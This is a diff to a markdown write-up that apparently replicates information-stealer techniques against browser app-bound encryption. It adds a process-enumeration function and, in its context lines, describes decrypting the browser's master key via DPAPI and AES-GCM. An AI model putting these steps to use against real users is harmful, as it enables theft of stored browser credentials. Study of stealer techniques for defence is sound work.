@@ -162,6 +162,8 @@ In this section, we will replicate the exact steps used by information stealers 
 
 ## 3️⃣ Functions of Program
 
+
+
 ### ReadFileContents
 
 ```php
@@ -220,6 +222,8 @@ PUCHAR ReadFileContents(_In_ PWCHAR FileName, _Inout_ PULONG Size)
 --> `This function opens a file, reads all of its contents into a heap-allocated memory buffer, and returns the raw bytes along with the file size for further processing.`
 
 
+
+
 ### ExtractAppBoundKey
 
 ```php
@@ -272,6 +276,8 @@ The ExtractAppBoundKey function is responsible for extracting the encrypted app-
 --> `Extracts the app-bound key by locating the app_bound_encrypted_key in the Local State file, Base64-decoding it, removing the "APPB" header, and decrypting the remaining blob using DPAPI and AES-256-GCM to recover the plaintext AES master key.`
 
 
+
+
 ### Base64Decode
 
 ```php
@@ -308,3 +314,55 @@ PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
 }
 ```
 --> `This function decodes the Base64-encoded app_bound_encrypted_key into raw bytes so it can be passed to DPAPI (CryptUnprotectData) for decryption.`
+
+
+### GetProcessPid
+```php
+ULONG GetProcessPid(_In_ LPCWSTR ProcessName)
+{
+    HANDLE         Snapshot;
+    ULONG          ProcessId = 0;
+    PROCESSENTRY32 Entry;
+
+
+
+    Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (Snapshot == INVALID_HANDLE_VALUE)
+    {
+        return 0;
+    }
+
+    Entry.dwSize = sizeof(PROCESSENTRY32);
+
+
+
+    if (Process32First(Snapshot, &Entry) == FALSE)
+    {
+        CloseHandle(Snapshot);
+        return 0;
+    }
+
+
+
+    do
+    {
+        if (wcscmp(Entry.szExeFile, ProcessName) == 0)
+        {
+            ProcessId = Entry.th32ProcessID;
+            break;
+        }
+
+    } while (Process32Next(Snapshot, &Entry));
+
+
+
+    CloseHandle(Snapshot);
+    return ProcessId;
+}
+```
+
+--> `This function enumerates running processes to find a process by name and returns its Process ID (PID).`
+
+
+
